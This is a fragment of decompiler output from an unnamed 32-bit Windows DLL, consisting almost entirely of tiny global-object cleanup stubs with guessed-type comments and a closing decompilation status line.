void __cdecl sub_100F3665()
{
  sub_1000D3AD((int *)&unk_10186A00);
}

//----- (100F366F) --------------------------------------------------------
void __cdecl sub_100F366F()
{
  sub_1000D3AD((int *)&unk_101869F0);
}

//----- (100F3679) --------------------------------------------------------
void __cdecl sub_100F3679()
{
  sub_1000D3AD((int *)&unk_101869F8);
}

//----- (100F3683) --------------------------------------------------------
void __cdecl sub_100F3683()
{
  sub_1000D3AD((int *)&unk_10186A30);
}

//----- (100F368D) --------------------------------------------------------
void __cdecl sub_100F368D()
{
  sub_1000D3AD((int *)&unk_10186A28);
}

//----- (100F3697) --------------------------------------------------------
void __cdecl sub_100F3697()
{
  sub_1000D3AD((int *)&unk_10186A20);
}

//----- (100F36A1) --------------------------------------------------------
void __cdecl sub_100F36A1()
{
  sub_1000D3AD((int *)&unk_10186A38);
}

//----- (100F36AB) --------------------------------------------------------
void __cdecl sub_100F36AB()
{
  sub_1000D3AD((int *)&unk_10186A48);
}

//----- (100F36B5) --------------------------------------------------------
void __cdecl sub_100F36B5()
{
  sub_1000D3AD((int *)&unk_10186A50);
}

//----- (100F36BF) --------------------------------------------------------
void __cdecl sub_100F36BF()
{
  sub_1000D3AD((int *)&unk_10186A40);
}

//----- (100F36C9) --------------------------------------------------------
void __cdecl sub_100F36C9()
{
  sub_1000D3AD((int *)&unk_10186A58);
}

//----- (100F36D3) --------------------------------------------------------
void __cdecl sub_100F36D3()
{
  sub_1000D3AD((int *)&unk_10186A68);
}

//----- (100F36DD) --------------------------------------------------------
void __cdecl sub_100F36DD()
{
  sub_1000D3AD((int *)&unk_10186A60);
}

//----- (100F36E7) --------------------------------------------------------
void __cdecl sub_100F36E7()
{
  sub_1000D3AD((int *)&unk_10186A70);
}

//----- (100F36F1) --------------------------------------------------------
void __cdecl sub_100F36F1()
{
  sub_1000D3AD((int *)&unk_10186A78);
}

//----- (100F36FB) --------------------------------------------------------
void __cdecl sub_100F36FB()
{
  sub_10029843(&off_10183604);
}
// 10183604: using guessed type int (__thiscall **off_10183604)(void *Block, char);

//----- (100F3705) --------------------------------------------------------
void __cdecl sub_100F3705()
{
  sub_1001ECA1(dword_10193C90);
}
// 10193C90: using guessed type int dword_10193C90[10];

//----- (100F370F) --------------------------------------------------------
void __cdecl sub_100F370F()
{
  sub_1000D3AD((int *)&unk_10186A80);
}

//----- (100F3719) --------------------------------------------------------
void __cdecl sub_100F3719()
{
  sub_1000BB54((int)&unk_10183438);
}

//----- (100F3726) --------------------------------------------------------
void __cdecl sub_100F3726()
{
  sub_1000D3AD(dword_10186A88);
}
// 10186A88: using guessed type _DWORD dword_10186A88[2];

//----- (100F3730) --------------------------------------------------------
void __cdecl sub_100F3730()
{
  sub_1000D3AD((int *)&unk_10186A90);
}

//----- (100F373A) --------------------------------------------------------
void __cdecl sub_100F373A()
{
  sub_1000D3AD((int *)&unk_10186A98);
}

//----- (100F3744) --------------------------------------------------------
void __cdecl sub_100F3744()
{
  sub_1000D3AD((int *)&unk_10186AA0);
}

//----- (100F374E) --------------------------------------------------------
void __cdecl sub_100F374E()
{
  sub_1000D3AD((int *)&unk_10186AA8);
}

//----- (100F3758) --------------------------------------------------------
void __cdecl sub_100F3758()
{
  sub_1000D3AD((int *)&unk_10186AB0);
}

//----- (100F3762) --------------------------------------------------------
void __cdecl sub_100F3762()
{
  sub_1000D3AD((int *)&unk_10186AB8);
}

//----- (100F376C) --------------------------------------------------------
void __cdecl sub_100F376C()
{
  sub_1000D3AD((int *)&unk_10186AC0);
}

//----- (100F3776) --------------------------------------------------------
void __cdecl sub_100F3776()
{
  sub_1000D3AD((int *)&unk_10186AC8);
}

//----- (100F3780) --------------------------------------------------------
void __cdecl sub_100F3780()
{
  sub_1000D3AD((int *)&unk_10186AD0);
}

//----- (100F378A) --------------------------------------------------------
void __cdecl sub_100F378A()
{
  sub_1000D3AD((int *)&unk_10186AD8);
}

//----- (100F3794) --------------------------------------------------------
void __cdecl sub_100F3794()
{
  sub_1000D3AD((int *)&unk_10186AE0);
}

//----- (100F379E) --------------------------------------------------------
void __cdecl sub_100F379E()
{
  sub_1004059F(&off_10182DE4);
}
// 10182DE4: using guessed type int (__thiscall **off_10182DE4)(void *Block, char);

//----- (100F37A8) --------------------------------------------------------
void __cdecl sub_100F37A8()
{
  sub_1000D3AD((int *)&unk_10186AE8);
}

//----- (100F37B2) --------------------------------------------------------
void __cdecl sub_100F37B2()
{
  sub_1000D3AD((int *)&unk_10186AF0);
}

//----- (100F37BC) --------------------------------------------------------
void __cdecl sub_100F37BC()
{
  sub_1000D3AD((int *)&unk_10186AF8);
}

//----- (100F37C6) --------------------------------------------------------
void __cdecl sub_100F37C6()
{
  sub_1000D3AD((int *)&unk_10186B00);
}

//----- (100F37D0) --------------------------------------------------------
void __cdecl sub_100F37D0()
{
  sub_1000D3AD((int *)&unk_10186B08);
}

//----- (100F37DA) --------------------------------------------------------
void __cdecl sub_100F37DA()
{
  sub_1000D3AD((int *)&unk_10186B10);
}

//----- (100F37E4) --------------------------------------------------------
void __cdecl sub_100F37E4()
{
  sub_1000D3AD((int *)&unk_10186B18);
}

//----- (100F37EE) --------------------------------------------------------
void __cdecl sub_100F37EE()
{
  sub_1000D3AD((int *)&unk_10186B20);
}

//----- (100F37F8) --------------------------------------------------------
void __cdecl sub_100F37F8()
{
  sub_1000D3AD((int *)&unk_10186B28);
}

//----- (100F3802) --------------------------------------------------------
void __cdecl sub_100F3802()
{
  sub_1000D3AD((int *)&unk_10186B38);
}

//----- (100F380C) --------------------------------------------------------
void __cdecl sub_100F380C()
{
  sub_1000D3AD((int *)&unk_10186B30);
}

//----- (100F3816) --------------------------------------------------------
void __cdecl sub_100F3816()
{
  sub_1000D3AD((int *)&unk_10186B40);
}

//----- (100F3820) --------------------------------------------------------
void __cdecl sub_100F3820()
{
  sub_1000D3AD((int *)&unk_10186B48);
}

//----- (100F382A) --------------------------------------------------------
void __cdecl sub_100F382A()
{
  sub_1000D3AD((int *)&unk_10186B50);
}

//----- (100F3834) --------------------------------------------------------
void __cdecl sub_100F3834()
{
  sub_1000D3AD((int *)&unk_10186B58);
}

//----- (100F383E) --------------------------------------------------------
void __cdecl sub_100F383E()
{
  sub_1000D3AD(dword_10186B60);
}
// 10186B60: using guessed type _DWORD dword_10186B60[2];

//----- (100F3848) --------------------------------------------------------
void __cdecl sub_100F3848()
{
  sub_1000D3AD((int *)&unk_10186B68);
}

//----- (100F3852) --------------------------------------------------------
void __cdecl sub_100F3852()
{
  sub_1000D3AD((int *)&unk_10186B88);
}

//----- (100F385C) --------------------------------------------------------
void __cdecl sub_100F385C()
{
  sub_1000D3AD((int *)&unk_10186BD0);
}

//----- (100F3866) --------------------------------------------------------
void __cdecl sub_100F3866()
{
  sub_1000D3AD((int *)&unk_10186B98);
}

//----- (100F3870) --------------------------------------------------------
void __cdecl sub_100F3870()
{
  sub_1000D3AD((int *)&unk_10186BA8);
}

//----- (100F387A) --------------------------------------------------------
void __cdecl sub_100F387A()
{
  sub_1000D3AD((int *)&unk_10186BC8);
}

//----- (100F3884) --------------------------------------------------------
void __cdecl sub_100F3884()
{
  sub_1000D3AD((int *)&unk_10186BB0);
}

//----- (100F388E) --------------------------------------------------------
void __cdecl sub_100F388E()
{
  sub_1000D3AD((int *)&unk_10186BA0);
}

//----- (100F3898) --------------------------------------------------------
void __cdecl sub_100F3898()
{
  sub_1000D3AD((int *)&unk_10186B80);
}

//----- (100F38A2) --------------------------------------------------------
void __cdecl sub_100F38A2()
{
  sub_1000D3AD((int *)&unk_10186BB8);
}

//----- (100F38AC) --------------------------------------------------------
void __cdecl sub_100F38AC()
{
  sub_1000D3AD((int *)&unk_10186B90);
}

//----- (100F38B6) --------------------------------------------------------
void __cdecl sub_100F38B6()
{
  sub_1000D3AD((int *)&unk_10186BC0);
}

//----- (100F38C0) --------------------------------------------------------
void __cdecl sub_100F38C0()
{
  sub_1000D3AD((int *)&unk_10186B70);
}

//----- (100F38CA) --------------------------------------------------------
void __cdecl sub_100F38CA()
{
  sub_1000D3AD((int *)&unk_10186BD8);
}

//----- (100F38D4) --------------------------------------------------------
void __cdecl sub_100F38D4()
{
  sub_1000D3AD((int *)&unk_10186B78);
}

//----- (100F38DE) --------------------------------------------------------
void __cdecl sub_100F38DE()
{
  sub_10037CC9((int *)&unk_10193D10);
}

//----- (100F38E8) --------------------------------------------------------
void __cdecl sub_100F38E8()
{
  sub_10038C5A(dword_10193D00);
}
// 10193D00: using guessed type _DWORD dword_10193D00[4];

//----- (100F38F2) --------------------------------------------------------
void __cdecl sub_100F38F2()
{
  sub_100392FB(dword_10193CB8);
}
// 10193CB8: using guessed type LONG dword_10193CB8[18];

//----- (100F38FC) --------------------------------------------------------
void __cdecl sub_100F38FC()
{
  sub_100380FA(dword_10193D20);
}
// 10193D20: using guessed type _DWORD dword_10193D20[4];

//----- (100F3906) --------------------------------------------------------
void __cdecl sub_100F3906()
{
  sub_1000D3AD((int *)&unk_10186BE8);
}

//----- (100F3910) --------------------------------------------------------
void __cdecl sub_100F3910()
{
  sub_1000D3AD((int *)&unk_10186BE0);
}

//----- (100F391A) --------------------------------------------------------
void __cdecl sub_100F391A()
{
  sub_1000D3AD((int *)&unk_10186BF0);
}

//----- (100F3924) --------------------------------------------------------
void __cdecl sub_100F3924()
{
  sub_1000D3AD((int *)&unk_10186C00);
}

//----- (100F392E) --------------------------------------------------------
void __cdecl sub_100F392E()
{
  sub_1000D3AD((int *)&unk_10186C2C);
}

//----- (100F3938) --------------------------------------------------------
void __cdecl sub_100F3938()
{
  sub_1000D3AD((int *)&unk_10186C5C);
}

//----- (100F3942) --------------------------------------------------------
void __cdecl sub_100F3942()
{
  sub_1000D3AD((int *)&unk_10186C4C);
}

//----- (100F394C) --------------------------------------------------------
void __cdecl sub_100F394C()
{
  sub_1000D3AD((int *)&unk_10186C34);
}

//----- (100F3956) --------------------------------------------------------
void __cdecl sub_100F3956()
{
  sub_1000D3AD((int *)&unk_10186C54);
}

//----- (100F3960) --------------------------------------------------------
void __cdecl sub_100F3960()
{
  sub_1000D3AD((int *)&unk_10186C44);
}

//----- (100F396A) --------------------------------------------------------
void __cdecl sub_100F396A()
{
  sub_1000D3AD((int *)&unk_10186C24);
}

//----- (100F3974) --------------------------------------------------------
void __cdecl sub_100F3974()
{
  sub_1000D3AD((int *)&unk_10186C3C);
}

//----- (100F397E) --------------------------------------------------------
void __cdecl sub_100F397E()
{
  sub_1000B3DF(dword_10186C10);
}
// 10186C10: using guessed type _DWORD dword_10186C10[3];

//----- (100F3988) --------------------------------------------------------
void __cdecl sub_100F3988()
{
  sub_1000D3AD((int *)&unk_10186C08);
}

//----- (100F3992) --------------------------------------------------------
void __cdecl sub_100F3992()
{
  sub_1000D3AD(&dword_10186BF8);
}
// 10186BF8: using guessed type int dword_10186BF8;

//----- (100F399C) --------------------------------------------------------
void __cdecl sub_100F399C()
{
  sub_1000D3AD((int *)&unk_10186C64);
}

//----- (100F39A6) --------------------------------------------------------
void __cdecl sub_100F39A6()
{
  sub_1000D3AD((int *)&unk_10186C6C);
}

//----- (100F39B0) --------------------------------------------------------
void __cdecl sub_100F39B0()
{
  dword_10186C88 = (int)off_10103CC0;
}
// 10103CC0: using guessed type int (__thiscall *off_10103CC0[2])(void *Block, char);
// 10186C88: using guessed type int dword_10186C88;

//----- (100F39BB) --------------------------------------------------------
void __cdecl sub_100F39BB()
{
  dword_10186C74 = (int)off_10103CC0;
}
// 10103CC0: using guessed type int (__thiscall *off_10103CC0[2])(void *Block, char);
// 10186C74: using guessed type int dword_10186C74;

//----- (100F39C6) --------------------------------------------------------
void __cdecl sub_100F39C6()
{
  sub_1000D3AD((int *)&unk_10186C9C);
}

//----- (100F39D0) --------------------------------------------------------
void __cdecl sub_100F39D0()
{
  sub_1000D3AD(&dword_10186CA8);
}
// 10186CA8: using guessed type int dword_10186CA8;

//----- (100F39DA) --------------------------------------------------------
void __cdecl sub_100F39DA()
{
  sub_1000D3AD(&dword_10186CB0);
}
// 10186CB0: using guessed type int dword_10186CB0;

//----- (100F39E4) --------------------------------------------------------
void __cdecl sub_100F39E4()
{
  sub_1000D3AD(&dword_10186CB8);
}
// 10186CB8: using guessed type int dword_10186CB8;

//----- (100F39EE) --------------------------------------------------------
void __cdecl sub_100F39EE()
{
  sub_1000D3AD((int *)&unk_10186CC0);
}

//----- (100F39F8) --------------------------------------------------------
void __cdecl sub_100F39F8()
{
  sub_1000D3AD((int *)&unk_10186CC8);
}

//----- (100F3A02) --------------------------------------------------------
void __cdecl sub_100F3A02()
{
  sub_1000D3AD((int *)&unk_10186CD0);
}

//----- (100F3A0C) --------------------------------------------------------
void __cdecl sub_100F3A0C()
{
  sub_1000D3AD((int *)&unk_10186CD8);
}

//----- (100F3A16) --------------------------------------------------------
void __cdecl sub_100F3A16()
{
  sub_1000D3AD(&dword_10186CE4);
}
// 10186CE4: using guessed type int dword_10186CE4;

//----- (100F3A20) --------------------------------------------------------
void __cdecl sub_100F3A20()
{
  sub_1000D3AD((int *)&unk_10186CEC);
}

//----- (100F3A2A) --------------------------------------------------------
void __cdecl sub_100F3A2A()
{
  sub_1000D3AD((int *)&unk_10186CF4);
}

//----- (100F3A34) --------------------------------------------------------
void __cdecl sub_100F3A34()
{
  sub_1000D3AD((int *)&unk_10186D14);
}

//----- (100F3A3E) --------------------------------------------------------
void __cdecl sub_100F3A3E()
{
  sub_1000D3AD((int *)&unk_10186D04);
}

//----- (100F3A48) --------------------------------------------------------
void __cdecl sub_100F3A48()
{
  sub_1000D3AD(dword_10186CFC);
}
// 10186CFC: using guessed type _DWORD dword_10186CFC[2];

//----- (100F3A52) --------------------------------------------------------
void __cdecl sub_100F3A52()
{
  sub_1000D3AD(dword_10186D0C);
}
// 10186D0C: using guessed type _DWORD dword_10186D0C[2];

//----- (100F3A5C) --------------------------------------------------------
void __cdecl sub_100F3A5C()
{
  sub_1000D3AD((int *)&unk_10186D6C);
}

//----- (100F3A66) --------------------------------------------------------
void __cdecl sub_100F3A66()
{
  sub_1000B3DF(dword_10186D30);
}
// 10186D30: using guessed type _DWORD dword_10186D30[3];

//----- (100F3A70) --------------------------------------------------------
void __cdecl sub_100F3A70()
{
  sub_1000B3DF(dword_10186EB0);
}
// 10186EB0: using guessed type _DWORD dword_10186EB0[5];

//----- (100F3A7A) --------------------------------------------------------
void __cdecl sub_100F3A7A()
{
  sub_1000B3DF(dword_10186DCC);
}
// 10186DCC: using guessed type _DWORD dword_10186DCC[5];

//----- (100F3A84) --------------------------------------------------------
void __cdecl sub_100F3A84()
{
  sub_1000B3DF(dword_10186DE0);
}
// 10186DE0: using guessed type _DWORD dword_10186DE0[3];

//----- (100F3A8E) --------------------------------------------------------
void __cdecl sub_100F3A8E()
{
  sub_1000B3DF(dword_10186E60);
}
// 10186E60: using guessed type _DWORD dword_10186E60[5];

//----- (100F3A98) --------------------------------------------------------
void __cdecl sub_100F3A98()
{
  sub_1000B3DF(dword_10186E08);
}
// 10186E08: using guessed type _DWORD dword_10186E08[3];

//----- (100F3AA2) --------------------------------------------------------
void __cdecl sub_100F3AA2()
{
  sub_1000B3DF(dword_10186E88);
}
// 10186E88: using guessed type _DWORD dword_10186E88[3];

//----- (100F3AAC) --------------------------------------------------------
void __cdecl sub_100F3AAC()
{
  sub_1000B3DF(dword_10186D58);
}
// 10186D58: using guessed type _DWORD dword_10186D58[3];

//----- (100F3AB6) --------------------------------------------------------
void __cdecl sub_100F3AB6()
{
  sub_1000B3DF(dword_10186D9C);
}
// 10186D9C: using guessed type _DWORD dword_10186D9C[5];

//----- (100F3AC0) --------------------------------------------------------
void __cdecl sub_100F3AC0()
{
  sub_1000B3DF(dword_10186E4C);
}
// 10186E4C: using guessed type _DWORD dword_10186E4C[5];

//----- (100F3ACA) --------------------------------------------------------
void __cdecl sub_100F3ACA()
{
  sub_1000B3DF(dword_10186D1C);
}
// 10186D1C: using guessed type _DWORD dword_10186D1C[5];

//----- (100F3AD4) --------------------------------------------------------
void __cdecl sub_100F3AD4()
{
  sub_1000B3DF(&dword_10186E1C);
}
// 10186E1C: using guessed type int dword_10186E1C;

//----- (100F3ADE) --------------------------------------------------------
void __cdecl sub_100F3ADE()
{
  sub_1000B3DF(dword_10186D44);
}
// 10186D44: using guessed type _DWORD dword_10186D44[3];

//----- (100F3AE8) --------------------------------------------------------
void __cdecl sub_100F3AE8()
{
  sub_1000B3DF(dword_10186E30);
}
// 10186E30: using guessed type _DWORD dword_10186E30[3];

//----- (100F3AF2) --------------------------------------------------------
void __cdecl sub_100F3AF2()
{
  sub_1000B3DF(dword_10186E9C);
}
// 10186E9C: using guessed type _DWORD dword_10186E9C[3];

//----- (100F3AFC) --------------------------------------------------------
void __cdecl sub_100F3AFC()
{
  sub_1000B3DF(dword_10186DF4);
}
// 10186DF4: using guessed type _DWORD dword_10186DF4[3];

//----- (100F3B06) --------------------------------------------------------
void __cdecl sub_100F3B06()
{
  sub_1000B3DF(dword_10186E74);
}
// 10186E74: using guessed type _DWORD dword_10186E74[3];

//----- (100F3B10) --------------------------------------------------------
void __cdecl sub_100F3B10()
{
  sub_1000B3DF(dword_10186D74);
}
// 10186D74: using guessed type _DWORD dword_10186D74[5];

//----- (100F3B1A) --------------------------------------------------------
void __cdecl sub_100F3B1A()
{
  sub_1000B3DF(dword_10186DB8);
}
// 10186DB8: using guessed type _DWORD dword_10186DB8[5];

//----- (100F3B24) --------------------------------------------------------
void __cdecl sub_100F3B24()
{
  sub_1000B3DF(dword_10186D88);
}
// 10186D88: using guessed type _DWORD dword_10186D88[3];

//----- (100F3B2E) --------------------------------------------------------
void __cdecl sub_100F3B2E()
{
  sub_1000D3AD((int *)&unk_10186EC4);
}

//----- (100F3B38) --------------------------------------------------------
void __cdecl sub_100F3B38()
{
  sub_1000D3AD((int *)&unk_10186ED4);
}

//----- (100F3B42) --------------------------------------------------------
void __cdecl sub_100F3B42()
{
  sub_1000D3AD((int *)&unk_10186EDC);
}

//----- (100F3B4C) --------------------------------------------------------
void __cdecl sub_100F3B4C()
{
  sub_1000D3AD((int *)&unk_10186ECC);
}

//----- (100F3B56) --------------------------------------------------------
void __cdecl sub_100F3B56()
{
  sub_1000D3AD((int *)&unk_10186EE4);
}

//----- (100F3B60) --------------------------------------------------------
void __cdecl sub_100F3B60()
{
  sub_1000D3AD((int *)&unk_10186EF4);
}

//----- (100F3B6A) --------------------------------------------------------
void __cdecl sub_100F3B6A()
{
  sub_1000D3AD((int *)&unk_10186EEC);
}

//----- (100F3B74) --------------------------------------------------------
void __cdecl sub_100F3B74()
{
  `eh vector destructor iterator'(&unk_101870A0, 0xCu, 4281, (void (__thiscall *)(void *))sub_10047B39);
}

//----- (100F3B8B) --------------------------------------------------------
void __cdecl sub_100F3B8B()
{
  sub_1000D3AD((int *)&unk_10186F54);
}

//----- (100F3B95) --------------------------------------------------------
void __cdecl sub_100F3B95()
{
  sub_1000B3DF(dword_1018703C);
}
// 1018703C: using guessed type _DWORD dword_1018703C[3];

//----- (100F3B9F) --------------------------------------------------------
void __cdecl sub_100F3B9F()
{
  sub_1000B3DF(dword_10186F38);
}
// 10186F38: using guessed type _DWORD dword_10186F38[3];

//----- (100F3BA9) --------------------------------------------------------
void __cdecl sub_100F3BA9()
{
  sub_1000B3DF(dword_10186F84);
}
// 10186F84: using guessed type _DWORD dword_10186F84[5];

//----- (100F3BB3) --------------------------------------------------------
void __cdecl sub_100F3BB3()
{
  sub_1000B3DF(dword_10186F98);
}
// 10186F98: using guessed type _DWORD dword_10186F98[3];

//----- (100F3BBD) --------------------------------------------------------
void __cdecl sub_100F3BBD()
{
  sub_1000B3DF(dword_10186FFC);
}
// 10186FFC: using guessed type _DWORD dword_10186FFC[3];

//----- (100F3BC7) --------------------------------------------------------
void __cdecl sub_100F3BC7()
{
  sub_1000B3DF(dword_10186FC0);
}
// 10186FC0: using guessed type _DWORD dword_10186FC0[3];

//----- (100F3BD1) --------------------------------------------------------
void __cdecl sub_100F3BD1()
{
  sub_1000D3AD((int *)&unk_10187080);
}

//----- (100F3BDB) --------------------------------------------------------
void __cdecl sub_100F3BDB()
{
  sub_1000B3DF(dword_10186F10);
}
// 10186F10: using guessed type int dword_10186F10[5];

//----- (100F3BE5) --------------------------------------------------------
void __cdecl sub_100F3BE5()
{
  sub_1000B3DF(dword_10186FE8);
}
// 10186FE8: using guessed type _DWORD dword_10186FE8[5];

//----- (100F3BEF) --------------------------------------------------------
void __cdecl sub_100F3BEF()
{
  sub_1000B3DF(dword_10186F70);
}
// 10186F70: using guessed type _DWORD dword_10186F70[5];

//----- (100F3BF9) --------------------------------------------------------
void __cdecl sub_100F3BF9()
{
  sub_1000B3DF(dword_10186F5C);
}
// 10186F5C: using guessed type _DWORD dword_10186F5C[5];

//----- (100F3C03) --------------------------------------------------------
void __cdecl sub_100F3C03()
{
  sub_1000B3DF(dword_10187050);
}
// 10187050: using guessed type _DWORD dword_10187050[5];

//----- (100F3C0D) --------------------------------------------------------
void __cdecl sub_100F3C0D()
{
  sub_1000B3DF(dword_10186F24);
}
// 10186F24: using guessed type _DWORD dword_10186F24[3];

//----- (100F3C17) --------------------------------------------------------
void __cdecl sub_100F3C17()
{
  sub_1000B3DF(dword_10186EFC);
}
// 10186EFC: using guessed type _DWORD dword_10186EFC[5];

//----- (100F3C21) --------------------------------------------------------
void __cdecl sub_100F3C21()
{
  sub_1000B3DF(dword_10187028);
}
// 10187028: using guessed type _DWORD dword_10187028[5];

//----- (100F3C2B) --------------------------------------------------------
void __cdecl sub_100F3C2B()
{
  sub_1000B3DF(dword_10187064);
}
// 10187064: using guessed type _DWORD dword_10187064[5];

//----- (100F3C35) --------------------------------------------------------
void __cdecl sub_100F3C35()
{
  sub_1000B3DF(dword_10186FAC);
}
// 10186FAC: using guessed type _DWORD dword_10186FAC[5];

//----- (100F3C3F) --------------------------------------------------------
void __cdecl sub_100F3C3F()
{
  sub_1000B3DF(dword_10186FD4);
}
// 10186FD4: using guessed type _DWORD dword_10186FD4[3];

//----- (100F3C49) --------------------------------------------------------
void __cdecl sub_100F3C49()
{
  sub_1000B3DF(dword_1019395C);
}
// 1019395C: using guessed type _DWORD dword_1019395C[3];

//----- (100F3C53) --------------------------------------------------------
void __cdecl sub_100F3C53()
{
  sub_1000D3AD(&dword_10187098);
}
// 10187098: using guessed type int dword_10187098;

//----- (100F3C5D) --------------------------------------------------------
void __cdecl sub_100F3C5D()
{
  sub_1000D3AD(&dword_10186F4C);
}
// 10186F4C: using guessed type int dword_10186F4C;

//----- (100F3C67) --------------------------------------------------------
void __cdecl sub_100F3C67()
{
  sub_1000D3AD(&dword_10187020);
}
// 10187020: using guessed type int dword_10187020;

//----- (100F3C71) --------------------------------------------------------
void __cdecl sub_100F3C71()
{
  sub_1000D3AD(&dword_1019394C);
}
// 1019394C: using guessed type int dword_1019394C;

//----- (100F3C7B) --------------------------------------------------------
void __cdecl sub_100F3C7B()
{
  sub_1000D3AD((int *)&unk_10187010);
}

//----- (100F3C85) --------------------------------------------------------
void __cdecl sub_100F3C85()
{
  sub_1000D3AD((int *)&unk_10187088);
}

//----- (100F3C8F) --------------------------------------------------------
void __cdecl sub_100F3C8F()
{
  sub_1000D3AD(dword_10193954);
}
// 10193954: using guessed type _DWORD dword_10193954[2];

//----- (100F3C99) --------------------------------------------------------
void __cdecl sub_100F3C99()
{
  sub_1000D3AD((int *)&unk_10187090);
}

//----- (100F3CA3) --------------------------------------------------------
void __cdecl sub_100F3CA3()
{
  sub_1000D3AD((int *)&unk_10187018);
}

//----- (100F3CAD) --------------------------------------------------------
void __cdecl sub_100F3CAD()
{
  sub_1000D3AD((int *)&unk_10187078);
}

//----- (100F3CB7) --------------------------------------------------------
void __cdecl sub_100F3CB7()
{
  sub_1000D3AD((int *)&unk_10193970);
}

//----- (100F3CC1) --------------------------------------------------------
void __cdecl sub_100F3CC1()
{
  sub_1000D3AD((int *)&unk_10193978);
}

//----- (100F3CCB) --------------------------------------------------------
void __cdecl sub_100F3CCB()
{
  sub_1000D3AD((int *)&unk_10193988);
}

//----- (100F3CD5) --------------------------------------------------------
void __cdecl sub_100F3CD5()
{
  sub_1000A159(&dword_1017DB50);
}
// 1017DB50: using guessed type _DWORD dword_1017DB50;

//----- (100F3CDF) --------------------------------------------------------
void __cdecl sub_100F3CDF()
{
  sub_1000A159(&dword_1017DB48);
}
// 1017DB48: using guessed type _DWORD dword_1017DB48;

//----- (100F3CE9) --------------------------------------------------------
void __cdecl sub_100F3CE9()
{
  sub_1000D3AD((int *)&unk_10193980);
}

//----- (100F3CF3) --------------------------------------------------------
void __cdecl sub_100F3CF3()
{
  sub_1000D3AD((int *)&unk_10193990);
}

//----- (100F3CFD) --------------------------------------------------------
void __cdecl sub_100F3CFD()
{
  sub_1000D3AD(dword_101939A0);
}
// 101939A0: using guessed type _DWORD dword_101939A0[2];

//----- (100F3D07) --------------------------------------------------------
void __cdecl sub_100F3D07()
{
  sub_1000D3AD((int *)&unk_10193998);
}

//----- (100F3D11) --------------------------------------------------------
void __cdecl sub_100F3D11()
{
  sub_1000D3AD(dword_101939A8);
}
// 101939A8: using guessed type _DWORD dword_101939A8[2];

//----- (100F3D1B) --------------------------------------------------------
void __cdecl sub_100F3D1B()
{
  sub_1000D3AD((int *)&unk_101939B0);
}

//----- (100F3D25) --------------------------------------------------------
void __cdecl sub_100F3D25()
{
  sub_1000780D(dword_1017DB58);
}
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];

//----- (100F3D2F) --------------------------------------------------------
void __cdecl sub_100F3D2F()
{
  sub_10020B81(dword_10193D40);
}
// 10193D40: using guessed type _DWORD dword_10193D40[2];

//----- (100F3D39) --------------------------------------------------------
void __cdecl sub_100F3D39()
{
  sub_10050AEE(&off_1018360C);
}
// 1018360C: using guessed type int (__thiscall **off_1018360C)(void *Block, char);

//----- (100F3D43) --------------------------------------------------------
void __cdecl sub_100F3D43()
{
  sub_1001ECA1(dword_10193D48);
}
// 10193D48: using guessed type int dword_10193D48[9];

//----- (100F3D4D) --------------------------------------------------------
void __cdecl sub_100F3D4D()
{
  sub_1000D3AD((int *)&unk_101939B8);
}

//----- (100F3D57) --------------------------------------------------------
void __cdecl sub_100F3D57()
{
  sub_1000D3AD(dword_101939E0);
}
// 101939E0: using guessed type _DWORD dword_101939E0[2];

//----- (100F3D61) --------------------------------------------------------
void __cdecl sub_100F3D61()
{
  sub_1000D3AD((int *)&unk_101939C0);
}

//----- (100F3D6B) --------------------------------------------------------
void __cdecl sub_100F3D6B()
{
  sub_1000D3AD(dword_101939C8);
}
// 101939C8: using guessed type _DWORD dword_101939C8[2];

//----- (100F3D75) --------------------------------------------------------
void __cdecl sub_100F3D75()
{
  sub_1000D3AD((int *)&unk_101939D8);
}

//----- (100F3D7F) --------------------------------------------------------
void __cdecl sub_100F3D7F()
{
  sub_1000D3AD(dword_101939D0);
}
// 101939D0: using guessed type _DWORD dword_101939D0[2];

//----- (100F3D89) --------------------------------------------------------
void __cdecl sub_100F3D89()
{
  sub_10056EA7(&off_10183614);
}
// 10183614: using guessed type int (__thiscall **off_10183614)(void *Block, char);

//----- (100F3D93) --------------------------------------------------------
void __cdecl sub_100F3D93()
{
  sub_1001ECA1(dword_10193D6C);
}
// 10193D6C: using guessed type int dword_10193D6C[9];

//----- (100F3D9D) --------------------------------------------------------
void __cdecl sub_100F3D9D()
{
  dword_101837E0[0] = &ikc::izq_ezibc::`vftable';
  sub_1009166F(dword_101837E0);
}
// 100FA4B4: using guessed type void *ikc::izq_ezibc::`vftable';
// 101837E0: using guessed type _DWORD dword_101837E0[3];

// nfuncs=4951 queued=4479 decompiled=4479 lumina nreq=0 worse=0 better=0
#error "There were 2 decompilation failure(s) on 4479 function(s)"
